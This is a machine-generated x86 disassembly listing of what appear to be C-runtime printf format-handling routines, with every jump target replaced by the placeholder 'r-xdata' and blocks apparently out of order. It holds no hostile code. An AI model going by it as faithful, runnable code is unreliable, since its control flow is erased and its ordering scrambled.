jne r-xdata
lea edi [ edx + 0x1 ]
sub_4245dd
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov esi ecx
push 0x67
pop ecx
push 0x47
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
pop edx
test eax eax
jns r-xdata
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp eax 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_418fb7
test al al
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp ax cx
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp eax 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_418f85
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp ax dx
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_418f85
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x32 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b841
push eax
mov ecx edi
call sub_418f85
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4357f4
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
movzx eax [ esi + 0x32 ]
push 0x67
pop ecx
cmp ax cx
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
push 0x47
pop ecx
cmp ax cx
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d85c
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d589
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
push 0x73
pop eax
mov [ esi + 0x32 ] ax
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_4247af
mov edi edi
push esi
mov esi ecx
push edi
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b4f1
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
je r-xdata
mov ecx [ edi + 0x404 ]
test ecx ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push ebx
mov ebx [ edi + 0x404 ]
movzx eax [ eax - 0x4 ]
test ebx ebx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov al [ eax - 0x4 ]
mov [ ecx ] al
mov [ esi + 0x38 ] 0x1
mov ecx edi
push eax
mov ecx edi
call sub_418f85
push eax
lea eax [ esi + 0x38 ]
push ebx
push eax
call sub_434609
add esp 0x10
pop ebx
test eax eax
je r-xdata
mov ebx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
pop esi
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_42483f
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push edi
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b4f1
add esp 0x10
test al al
je r-xdata
lea edi [ esi + 0x40 ]
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
xor eax eax
mov ecx esi
mov [ ebp - 0x4 ] ax
lea eax [ ebp - 0x4 ]
push eax
call sub_41b061
test al al
jne r-xdata
push eax
mov ecx esi
call sub_4197a5
test al al
je r-xdata
mov eax edi
mov ecx esi
call sub_41f2ce
test al al
je r-xdata
xor al al
jmp r-xdata
mov ecx esi
call sub_41f2ce
test al al
je r-xdata
mov al 0x1
lea edi [ esi + 0x40 ]
push ebx
mov ebx [ edi + 0x404 ]
test ebx ebx
jne r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ esi + 0x38 ] 0x1
push [ ebp - 0x4 ]
mov ecx edi
call sub_418f85
push eax
lea eax [ esi + 0x38 ]
push ebx
push eax
call sub_434609
add esp 0x10
pop ebx
test eax eax
je r-xdata
mov ebx edi
mov [ esi + 0x34 ] edi
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_4248ff
mov edi edi
push esi
mov esi ecx
push edi
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b4f1
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
je r-xdata
mov ecx [ edi + 0x404 ]
test ecx ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push ebx
mov ebx [ edi + 0x404 ]
movzx eax [ eax - 0x4 ]
test ebx ebx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov al [ eax - 0x4 ]
mov [ ecx ] al
mov [ esi + 0x38 ] 0x1
mov ecx edi
push eax
mov ecx edi
call sub_418f85
push eax
lea eax [ esi + 0x38 ]
push ebx
push eax
call sub_434609
add esp 0x10
pop ebx
test eax eax
je r-xdata
mov ebx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
pop esi
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_42498f
mov edi edi
push esi
mov esi ecx
push edi
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b4f1
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
je r-xdata
mov ecx [ edi + 0x404 ]
test ecx ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push ebx
mov ebx [ edi + 0x404 ]
movzx eax [ eax - 0x4 ]
test ebx ebx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov al [ eax - 0x4 ]
mov [ ecx ] al
mov [ esi + 0x38 ] 0x1
mov ecx edi
push eax
mov ecx edi
call sub_418f85
push eax
lea eax [ esi + 0x38 ]
push ebx
push eax
call sub_434609
add esp 0x10
pop ebx
test eax eax
je r-xdata
mov ebx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
pop esi
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_424a1f
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push edi
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b4f1
add esp 0x10
test al al
je r-xdata
lea edi [ esi + 0x40 ]
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
xor eax eax
mov ecx esi
mov [ ebp - 0x4 ] ax
lea eax [ ebp - 0x4 ]
push eax
call sub_41b0e3
test al al
jne r-xdata
push eax
mov ecx esi
call sub_419823
test al al
je r-xdata
mov eax edi
mov ecx esi
call sub_41f2e4
test al al
je r-xdata
xor al al
jmp r-xdata
mov ecx esi
call sub_41f2e4
test al al
je r-xdata
mov al 0x1
lea edi [ esi + 0x40 ]
push ebx
mov ebx [ edi + 0x404 ]
test ebx ebx
jne r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ esi + 0x38 ] 0x1
push [ ebp - 0x4 ]
mov ecx edi
call sub_418f85
push eax
lea eax [ esi + 0x38 ]
push ebx
push eax
call sub_434609
add esp 0x10
pop ebx
test eax eax
je r-xdata
mov ebx edi
mov [ esi + 0x34 ] edi
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_424adf
mov edi edi
push esi
mov esi ecx
push edi
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b4f1
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
je r-xdata
mov ecx [ edi + 0x404 ]
test ecx ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push ebx
mov ebx [ edi + 0x404 ]
movzx eax [ eax - 0x4 ]
test ebx ebx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov al [ eax - 0x4 ]
mov [ ecx ] al
mov [ esi + 0x38 ] 0x1
mov ecx edi
push eax
mov ecx edi
call sub_418f85
push eax
lea eax [ esi + 0x38 ]
push ebx
push eax
call sub_434609
add esp 0x10
pop ebx
test eax eax
je r-xdata
mov ebx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
pop esi
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_424b6f
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ esi + 0x3c ] 0x1
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push [ esi + 0x2c ]
movzx ebx [ eax - 0x4 ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b531
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
jne r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx [ edi + 0x404 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] al
test ecx ecx
jne r-xdata
mov [ eax ] bx
mov eax edi
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_43434d
add esp 0x10
test eax eax
jns r-xdata
mov ecx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] 0x1
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_424c07
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
xor eax eax
mov esi ecx
mov [ ebp - 0x4 ] ax
lea eax [ ebp - 0x4 ]
push eax
mov [ esi + 0x3c ] 0x1
call sub_41b165
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx esi
call sub_41f2fa
test al al
je r-xdata
mov al 0x1
movzx eax [ esi + 0x32 ]
push edi
push [ esi + 0x2c ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b531
add esp 0x10
lea edi [ esi + 0x40 ]
mov ecx [ edi + 0x404 ]
test al al
jne r-xdata
test ecx ecx
jne r-xdata
mov al [ ebp - 0x4 ]
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] 0x0
test ecx ecx
jne r-xdata
mov ax [ ebp - 0x4 ]
mov [ ecx ] ax
mov ecx edi
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_43434d
add esp 0x10
test eax eax
jns r-xdata
mov ecx edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] 0x1
pop edi
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_424cb6
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ esi + 0x3c ] 0x1
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push [ esi + 0x2c ]
movzx ebx [ eax - 0x4 ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b531
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
jne r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx [ edi + 0x404 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] al
test ecx ecx
jne r-xdata
mov [ eax ] bx
mov eax edi
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_43434d
add esp 0x10
test eax eax
jns r-xdata
mov ecx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] 0x1
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_424d4e
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ esi + 0x3c ] 0x1
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push [ esi + 0x2c ]
movzx ebx [ eax - 0x4 ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b531
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
jne r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx [ edi + 0x404 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] al
test ecx ecx
jne r-xdata
mov [ eax ] bx
mov eax edi
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_43434d
add esp 0x10
test eax eax
jns r-xdata
mov ecx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] 0x1
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_424de6
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
xor eax eax
mov esi ecx
mov [ ebp - 0x4 ] ax
lea eax [ ebp - 0x4 ]
push eax
mov [ esi + 0x3c ] 0x1
call sub_41b1e7
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx esi
call sub_41f310
test al al
je r-xdata
mov al 0x1
movzx eax [ esi + 0x32 ]
push edi
push [ esi + 0x2c ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b531
add esp 0x10
lea edi [ esi + 0x40 ]
mov ecx [ edi + 0x404 ]
test al al
jne r-xdata
test ecx ecx
jne r-xdata
mov al [ ebp - 0x4 ]
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] 0x0
test ecx ecx
jne r-xdata
mov ax [ ebp - 0x4 ]
mov [ ecx ] ax
mov ecx edi
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_43434d
add esp 0x10
test eax eax
jns r-xdata
mov ecx edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] 0x1
pop edi
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_424e95
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ esi + 0x3c ] 0x1
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push [ esi + 0x2c ]
movzx ebx [ eax - 0x4 ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b531
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
jne r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx [ edi + 0x404 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] al
test ecx ecx
jne r-xdata
mov [ eax ] bx
mov eax edi
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_43434d
add esp 0x10
test eax eax
jns r-xdata
mov ecx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] 0x1
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_424fd5
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_423023
pop ecx
mov ebx eax
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x1
je r-xdata
movzx eax [ eax - 0x4 ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
cdq
mov ecx eax
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x4
je r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov ecx [ eax - 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x8
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
jmp r-xdata
xor al al
jmp r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41b8d7
push edx
push ecx
mov ecx esi
call sub_41be53
jmp r-xdata
mov al 0x1
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_42510f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_423023
and [ ebp - 0x8 ] 0x0
mov ebx eax
and [ ebp - 0x4 ] 0x0
pop ecx
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
sub ecx 0x1
je r-xdata
call sub_4192b5
call sub_41903d
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
mov ecx esi
call sub_41f2ce
test al al
je r-xdata
xor al al
jmp r-xdata
test al al
jne r-xdata
call sub_4198d5
jmp r-xdata
call sub_41952d
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
sub ecx 0x4
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_419db9
jmp r-xdata
call sub_419b4d
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
call sub_41ada9
jmp r-xdata
call sub_41aaf1
jmp r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41b94c
push edx
push ecx
mov ecx esi
call sub_41bedb
jmp r-xdata
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov eax [ esi + 0x34 ]
mov [ eax ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_425275
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_423023
pop ecx
mov ebx eax
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x1
je r-xdata
movzx eax [ eax - 0x4 ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
cdq
mov ecx eax
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x4
je r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov ecx [ eax - 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x8
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
jmp r-xdata
xor al al
jmp r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41b9c1
push edx
push ecx
mov ecx esi
call sub_41bf63
jmp r-xdata
mov al 0x1
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_4253af
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_423023
pop ecx
mov ebx eax
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x1
je r-xdata
movzx eax [ eax - 0x4 ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
cdq
mov ecx eax
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x4
je r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov ecx [ eax - 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x8
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
jmp r-xdata
xor al al
jmp r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41ba36
push edx
push ecx
mov ecx esi
call sub_41bfeb
jmp r-xdata
mov al 0x1
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_4254e9
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_423023
and [ ebp - 0x8 ] 0x0
mov ebx eax
and [ ebp - 0x4 ] 0x0
pop ecx
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
sub ecx 0x1
je r-xdata
call sub_419334
call sub_4190bc
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
mov ecx esi
call sub_41f2e4
test al al
je r-xdata
xor al al
jmp r-xdata
test al al
jne r-xdata
call sub_419954
jmp r-xdata
call sub_4195ac
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
sub ecx 0x4
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_419e3f
jmp r-xdata
call sub_419bca
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
call sub_41ae37
jmp r-xdata
call sub_41ab7f
jmp r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
